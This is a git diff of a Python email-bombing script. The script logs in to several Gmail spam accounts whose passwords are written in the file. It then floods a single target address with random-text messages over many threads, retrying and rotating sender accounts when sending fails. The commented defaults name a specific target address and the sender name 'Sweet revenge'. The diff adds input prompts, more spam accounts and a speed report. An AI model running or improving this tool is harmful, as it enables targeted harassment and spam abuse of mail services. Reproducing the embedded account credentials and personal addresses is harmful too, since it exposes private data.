@@ -3,22 +3,38 @@ from random import randrange
 import threading as t
 
 emails = {"sceet421@gmail.com":"fwbodppm",
-          #"sceet422@gmail.com":"fwbotdffu533",
+          "sceet422@gmail.com":"fwbotdffu533",
           #"evanalekseyev@gmail.com":"fwbodppm",
-          "arandomperson4206969@gmail.com":"jepoufwfolopx21"
+          "arandomperson4206969@gmail.com":"jepoufwfolopx21",
+          "anotherspamemail514@gmail.com":"jepoufwfolopx3",
+          "anotherspamemail513@gmail.com":"jepoufwfolopx2"
           }
-subject = ""
-name = sys.argv[2] #"Sweet revenge"
-target = sys.argv[1] #"alexzhu23@mittymonarch.com"
-reps = int(sys.argv[3]) #100
-threads = 30
 
-# generate empty list (for thread array)
-def returnNone(lenlist):
-	obj = []
-	for i in range(lenlist):
-		obj.append(None)
-	return obj
+target = input("Target > ") #sys.argv[1] #"alexzhu23@mittymonarch.com"
+
+try:
+    target.index("@")
+except:
+    print("invalid target, quitting...")
+    quit()
+
+name = input("Name of sender, default none > ") #sys.argv[2] #"Sweet revenge"
+subject = input("Subject > ")
+
+reps = input("Email count > ") #int(sys.argv[3]) #100
+if reps == "":
+    reps = 50
+else:
+    reps = int(reps)
+emailCount = reps
+
+threads = input("Thread count > ") #30
+if threads == "":
+    threads = int(reps / 2)
+else:
+    threads = int(threads)
+
+print("{} emails will be sent to {} using {} threads at a time. Starting...".format(str(reps), str(target), str(threads)))
 
 # generate random amount of text of iter length
 def random_text(iter):
@@ -37,6 +53,7 @@ def random_text(iter):
 count = 1
 def main(from_name, sent_from, sent_from_pass_enc, to_email, subject="", num=1):
     global count
+    global emails
     # set headers and body
     email_text = "From: {}\n".format(from_name)
     email_text += "To: {}\n".format(to_email)
@@ -58,25 +75,27 @@ def main(from_name, sent_from, sent_from_pass_enc, to_email, subject="", num=1):
         server.login(sent_from, sent_from_pass)
         server.sendmail(sent_from, [to_email], email_text)
         server.close()
-        print('Email ' + str(count) + ' sent from ' + sent_from + ' on try ' + str(num))
+        print('Email ' + str(count) + ' on try ' + str(num))
         count += 1
     except Exception as e:
         # try sending again after short sleep
-        if num < 20:
+        if num < 10:
             time.sleep(0.05)
-            main(from_name, sent_from, sent_from_pass_enc, to_email, subject, num+1)
+            try:
+                main(from_name, sent_from, sent_from_pass_enc, to_email, subject, num+1)
+            except:
+                num+=1
         #if it has been trying for some time, print error
         else:
-            print(e)
-            emails.pop(list(emails.keys()).index(sent_from))
+            print("Failed to send from " + sent_from)
             main(name,
-                 list(emails.keys())[randrange(len(list(emails.keys())))],
-                 list(emails.values())[randrange(len(list(emails.values())))],
-                 target)
+                 list(emails.keys())[emails.keys().index(sent_from)-1],
+                 list(emails.values())[emails.keys().index(sent_from)-1],
+                 target, num+1)
 
 if __name__ == "__main__":
     startTime = time.time()
-    p = returnNone(threads)
+    p = [None for i in range(threads)]
     if reps <= threads:
         for i in range(reps):
             p[i] = t.Thread(target=main,
@@ -114,11 +133,11 @@ if __name__ == "__main__":
                     break
             if reps <= 0:
                 # replace threads for num
-                print("Waiting for all threads to finish", end="")
                 for i in range(threads):
                     p[i].join()
-                    print(".", end="")
                 break
 
-    print("\nfinished in " + str(time.time() - startTime) + " seconds. Good job Evan!")
-    # main("PP", "sceet421@gmail.com", 'fwbodppm', "giantsmilodon@gmail.com")
+    totalTime = time.time() - startTime
+
+    print("\nFinished in " + str(totalTime) + " seconds.")
+    print("Average speed: " + str(emailCount / float(totalTime)) + " emails per second.")
